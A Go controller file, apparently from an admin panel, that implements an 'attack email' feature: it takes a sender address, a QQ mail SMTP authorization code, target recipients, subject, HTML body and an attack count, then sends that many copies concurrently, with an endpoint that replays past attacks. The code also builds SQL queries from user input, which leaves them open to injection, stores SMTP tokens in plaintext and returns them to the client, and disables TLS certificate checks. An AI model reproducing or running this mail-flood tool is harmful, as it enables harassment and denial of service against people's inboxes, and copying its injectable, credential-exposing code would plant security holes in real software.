package controllers

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	log "github.com/gogap/logrus"
	"github.com/iiinsomnia/goadmin/helpers"
	"github.com/shenghui0779/yiigo"
	"gopkg.in/gomail.v2"
)

type attackEmailItem struct {
	Page      int    `json:"page" valid:"required"`
	Size      int    `json:"size" valid:"required"`
	Send      string `json:"send"`
	Token     string `json:"token"`
	Send_to   string `json:"send_to"`
	Subject   string `json:"subject"`
	Body      string `json:"body"`
	Count     string `json:"count"`
	Create_at string `json:"create_at"`
	Role      int    `json:"role"`
	From      string
}
type attackEmailItemAgain struct {
	Create_at string `json:"create_at"`
}
type attackEmailListReply struct {
	Count int64              `json:"count"`
	List  []*attackEmailItem `json:"list"`
}

func AttackEmail(c *gin.Context) {
	Render(c, "attack_email", gin.H{"menu": "9"})
}
func AttackEmailQuery(c *gin.Context) {
	s := &attackEmailItem{}

	if err := c.ShouldBindJSON(s); err != nil {
		Err(c, helpers.Error(helpers.ErrParams, err))
		return
	}

	if s.Send == "" && s.Send_to == "" && s.Count == "" && s.Subject == "" && s.Body == "" && s.Token == "" {
		s.Do(c)
	} else {
		if !strings.Contains(s.Send, "@") || !strings.Contains(s.Send_to, "@") ||
			strings.Contains(s.Send, " ") || strings.Contains(s.Send_to, " ") {
			Err(c, helpers.Error(helpers.ErrParams), "邮箱不合法")
			return
		}

		if strings.Contains(s.Token, " ") {
			Err(c, helpers.Error(helpers.ErrParams), "授权码不合法")
			return
		}

		count, err := strconv.Atoi(s.Count)
		if err != nil || count <= 0 {
			Err(c, helpers.Error(helpers.ErrParams), "攻击次数不合法")
			return
		}

		if s.Send == "" || s.Send_to == "" || s.Count == "" || s.Subject == "" || s.Body == "" || s.Token == "" {
			Err(c, helpers.Error(helpers.ErrParams), "字段不能为空")
			return
		}

		s.From = "Don't open email"
		if err := s.writeEventToDB(); err != nil {
			log.Error(err)
			Err(c, helpers.Error(helpers.ErrParams), "写入数据失败: "+err.Error())
		}

		var wg sync.WaitGroup
		wg.Add(count)
		for i := 0; i < count; i++ {
			go func() {
				defer wg.Done()
				if err := s.send(); err != nil {
					log.Error(err)
					Err(c, helpers.Error(helpers.ErrParams), "发送失败: "+err.Error())
					return
				}
			}()
		}
		wg.Wait()
		s.Do(c)
	}
}
func (s *attackEmailItem) send() error {
	//定义邮箱服务器连接信息，如果是阿里邮箱 pass填密码，qq邮箱填授权码
	mailConn := map[string]string{
		"user": s.Send,
		"pass": s.Token,
		"host": "smtp.qq.com",
		"port": "25",
	}

	var mailTo []string
	if strings.Contains(s.Send_to, ",") {
		mailTo = strings.Split(s.Send_to, ",")
	}
	mailTo = append(mailTo, s.Send_to)
	port, _ := strconv.Atoi(mailConn["port"]) //转换端口类型为int
	m := gomail.NewMessage()
	m.SetHeader("From", s.From+"<"+mailConn["user"]+">") //这种方式可以添加别名，即“XD Game”， 也可以直接用<code>m.SetHeader("From",mailConn["user"])</code> 读者可以自行实验下效果
	m.SetHeader("To", mailTo...)                         //发送给多个用户
	m.SetHeader("Subject", s.Subject)                    //设置邮件主题
	m.SetBody("text/html", s.Body)                       //设置邮件正文
	d := gomail.NewDialer(mailConn["host"], port, mailConn["user"], mailConn["pass"])
	d.TLSConfig = &tls.Config{InsecureSkipVerify: true}

	if err := d.DialAndSend(m); err != nil {
		return err
	}
	return nil
}

func (s *attackEmailItem) writeEventToDB() error {
	db := yiigo.DB()
	sql := fmt.Sprintf(`insert into attack_email(create_at,send,token,send_to,count,subject,body) values("%v","%v","%v","%v","%v","%v","%v")`,
		time.Now().Format("2006-01-02 15:04:05"), s.Send, s.Token, s.Send_to, s.Count, s.Subject, s.Body)

	_, err := db.Exec(sql)
	if err != nil {
		return err
	}
	return nil
}

func (s *attackEmailItem) Do(c *gin.Context) {
	db := yiigo.DB()
	sql := "select create_at,send,token,send_to,count,subject,body from attack_email"

	rows, err := db.Query(sql)
	if err != nil {
		log.Error(err)
		return
	}
	defer rows.Close()

	datas := make([]*attackEmailItem, 0)
	for rows.Next() {
		var create_at, send, token, send_to, count, subject, body string
		err := rows.Scan(&create_at, &send, &token, &send_to, &count, &subject, &body)
		if err != nil {
			log.Error(err)
			return
		}

		data := new(attackEmailItem)
		data.Create_at = create_at
		data.Send = send
		data.Token = token
		data.Send_to = send_to
		data.Count = count
		data.Subject = subject
		data.Body = body
		datas = append(datas, data)
	}

	sort.Slice(datas, func(i, j int) bool { // desc
		return datas[i].Create_at > datas[j].Create_at
	})

	obj := gin.H{
		"err":  false,
		"code": 1000,
		"msg":  "success",
	}

	resp := &attackEmailListReply{
		Count: int64(len(datas)),
		List:  datas,
	}

	obj["data"] = resp

	c.Set("response", obj)
	c.JSON(http.StatusOK, obj)
}

func AttackEmailAgain(c *gin.Context) {
	s := &attackEmailItemAgain{}
	ss := &attackEmailItem{}
	if err := c.ShouldBindJSON(s); err != nil {
		Err(c, helpers.Error(helpers.ErrParams, err))
		return
	}
	if s.Create_at == "" {
		Err(c, helpers.Error(helpers.ErrParams, fmt.Errorf("服务器错误")))
		return
	}
	db := yiigo.DB()
	sql := `select create_at,send,token,send_to,count,subject,body from attack_email where create_at="` + s.Create_at + `"`
	rows, err := db.Query(sql)
	if err != nil {
		log.Error(err)
		return
	}
	defer rows.Close()
	for rows.Next() {
		var create_at, send, token, send_to, count, subject, body string
		if err := rows.Scan(&create_at, &send, &token, &send_to, &count, &subject, &body); err != nil {
			Err(c, helpers.Error(helpers.ErrParams, err))
			log.Error(err)
			return
		}

		ss.Create_at = create_at
		ss.Send = send
		ss.Token = token
		ss.Send_to = send_to
		ss.Count = count
		ss.Subject = subject
		ss.Body = body
	}
	count, err := strconv.Atoi(ss.Count)
	if err != nil {
		Err(c, helpers.Error(helpers.ErrParams, err))
		return
	}

	var wg sync.WaitGroup
	wg.Add(count)
	for i := 0; i < count; i++ {
		go func() {
			defer wg.Done()
			if err := ss.send(); err != nil {
				log.Error(err)
				Err(c, helpers.Error(helpers.ErrParams), "发送失败: "+err.Error())
				return
			}
		}()
	}
	wg.Wait()

	ss.From = "Don't open email"
	if err := ss.writeEventToDB(); err != nil {
		log.Error(err)
		Err(c, helpers.Error(helpers.ErrParams), "写入数据失败: "+err.Error())
	}
	ss.Do(c)
}
